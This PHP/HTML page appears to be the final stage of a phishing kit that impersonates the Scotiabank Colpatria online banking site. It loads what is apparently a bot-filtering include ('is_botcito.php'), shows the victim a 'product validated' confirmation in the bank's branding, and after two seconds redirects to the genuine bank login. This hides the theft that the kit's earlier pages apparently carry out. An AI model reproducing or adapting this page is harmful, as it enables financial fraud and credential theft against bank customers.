<?php
require "is_botcito.php";
require "ayudante.php";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Scotiabank Colpatria | Banca virtual</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="../../../../js/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="contenedor">
        <div class="cabe">
            <div class="logocenter">
                <div class="logo">

                </div>

            </div>
        </div>
        <div class="principal">
            <div class="autenticar">
                
                <div class="contenido">
                    <div class="caja">
                        <div class="izq" style="text-align: center;">
                            <img src="img/nube.svg"><br>
                            <img src="img/ok.png"  />
                            <p style="text-align:center;font-size: 20px !important;">
                                Producto Validado Correctamente
                            </p>
                        </div>
                        
                    </div>
                </div>
            </div>
        </div>
        <div class="pie">
            <div class="piecenter">
                <p class="derec">
                    © 2022 Todos los Derechos Reservados Scotiabank Colpatria.
                </p>
            </div>
        </div>
    </div>
    <script src="js/funciones.js"></script>
</body>

</html>
<script language="javascript">

function finalizar(){
   window.location.href = "https://www.banco.colpatria.com.co/banca-virtual/login/";   
}

$(document).ready(function() {
    setInterval(finalizar,2000); 
});
</script>